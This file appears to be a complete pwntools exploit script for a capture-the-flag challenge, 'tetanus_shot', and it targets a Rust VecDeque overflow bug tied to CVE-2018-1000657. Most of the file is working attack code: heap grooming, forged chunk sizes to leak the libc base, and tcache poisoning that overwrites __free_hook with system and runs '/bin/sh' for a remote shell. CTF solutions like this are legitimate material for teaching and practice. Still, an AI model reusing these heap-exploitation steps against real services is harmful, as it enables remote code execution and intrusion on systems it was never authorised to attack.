from pwn import *

IP = "2020.redpwnc.tf"
PORT = 31754

bin = ELF('./tetanus_shot')
libc = ELF('./libc.so.6')
context(arch='amd64')
p = remote(IP, PORT)

'''
https://gts3.org/2019/cve-2018-1000657.html
want to call VecDeque::with_capacity(N)
call push front twice
call push back 0
reserve N-3
now using push back you can overflow
'''


def wait():
    p.recvrepeat(0.1)


def alloc(size):
    p.sendlineafter('>', '1')
    p.sendlineafter('>', str(size))


def free(index):
    p.sendlineafter('>', '2')
    p.sendlineafter('>', str(index))


def append(index, values):  # push back
    p.sendlineafter('>', '5')
    p.sendlineafter('>', str(index))
    p.sendlineafter('>', str(len(values)))
    for v in values:
        p.sendlineafter('>', str(v))


def prepend(index, values):  # push front
    p.sendlineafter('>', '4')
    p.sendlineafter('>', str(index))
    p.sendlineafter('>', str(len(values)))
    for v in values:
        p.sendlineafter('>', str(v))


def view(index, subindex):
    p.sendlineafter('>', '6')
    p.sendlineafter('>', str(index))
    p.sendlineafter('>', str(subindex))


def edit(index, subindex, data):
    p.sendlineafter('>', '3')
    p.sendlineafter('>', str(index))
    p.sendlineafter('>', str(subindex))
    p.sendlineafter('>', str(data))


# messing with heap to help get me a consecutive region of chunks in memory
for i in range(10):
    alloc(200)
for i in range(10):
    free(0)

alloc(50)  # 0
alloc(50)  # 1
alloc(50)  # 2

alloc(50)  # 3

# grouped together consecutively in memory
# rce tcache poison portion
alloc(50)  # 4
alloc(50)  # 5
alloc(100)  # 6
# libc leak portion
alloc(50)  # 7
alloc(50)  # 8
alloc(150)  # 9

alloc(100)  # 10, to save for a later free
alloc(100)  # 11 to save for a later free

# at this point, we have 6 chunks close to each other
'''
Allocated chunk | PREV_INUSE 1-3 for the later write what where
Addr: 0x5641ae58c900
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x5641ae58cb10
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x5641ae58cd20
Size: 0x411

Allocated chunk | PREV_INUSE 4-6 for the libc leak
Addr: 0x5641ae58d130
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x5641ae58d340
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x5641ae58d550
Size: 0x811
'''
# 7:A
# 8:B
# 9:C

# 8 byte overflowing
prepend(7, [0x4141414141414141] * 2)
append(7, [0])
append(7, [0x411] * 47)

append(9, [0x21] * 70)
free(8)
alloc(100)
# 7:A
# 8:C
# 11:B
append(11, [0x4141414141414141] * 64 + [0, 0x811, 0x1337, 0x1337])
free(8)
# B is 10 now
view(10, 67)
libc.address = int(p.recvline().split(' ')[2]) - 0x1eabe0
log.info("libc base: %s" % hex(libc.address))

# now time for RCE
# 4: A
# 5: B
# 6: C

# 8 byte overflowing
prepend(4, [0x4141414141414141] * 2)
append(4, [0])
append(4, [0x411] * 47)

append(6, [0x21] * 70)
free(5)
alloc(100)  # B is 10
append(10, [0x4141414141414141] * 64 + [0, 0x411, 0x1337, 0x1337, 0x1337, 0x1337])
free(8)  # B is 9
free(7)  # B is 8
free(5)  # B is 7
edit(7, 66, libc.symbols['__free_hook'] - 8)
alloc(100)
alloc(100)  # 9
append(9, [0x68732f6e69622f, libc.symbols['system']])
free(0)

p.interactive()
